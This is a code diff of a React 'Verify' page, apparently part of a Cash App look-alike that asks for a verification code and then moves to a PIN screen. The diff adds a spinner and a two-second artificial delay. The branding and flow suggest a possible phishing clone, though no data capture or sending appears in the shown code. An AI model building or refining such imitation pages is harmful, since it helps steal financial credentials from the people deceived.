@@ -1,11 +1,12 @@
 import React, { useState } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
-import { HelpCircle } from 'lucide-react';
+import { HelpCircle, Loader2 } from 'lucide-react';
 import { CashAppLogo } from '../components/CashAppLogo';
 import { RecaptchaBadge } from '../components/RecaptchaBadge';
 
 export function Verify() {
   const [code, setCode] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
   const location = useLocation();
   const navigate = useNavigate();
   const contact = location.state?.contact || '(209) 432-9317';
@@ -14,7 +15,10 @@ export function Verify() {
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (code.length > 0) {
-      navigate('/pin');
+      setIsLoading(true);
+      setTimeout(() => {
+        navigate('/pin');
+      }, 2000);
     }
   };
 
@@ -53,8 +57,13 @@ export function Verify() {
 
           <button
             type="submit"
-            className="w-[200px] bg-[#C2C2C2] text-black font-semibold rounded-full py-[14px] text-[17px] hover:bg-white transition-colors">
-            Continue
+            disabled={isLoading}
+            className="w-[200px] bg-[#C2C2C2] text-black font-semibold rounded-full py-[14px] text-[17px] hover:bg-white transition-colors flex items-center justify-center">
+            {isLoading ? (
+              <Loader2 className="animate-spin" size={24} strokeWidth={3} />
+            ) : (
+              'Continue'
+            )}
           </button>
         </form>
 
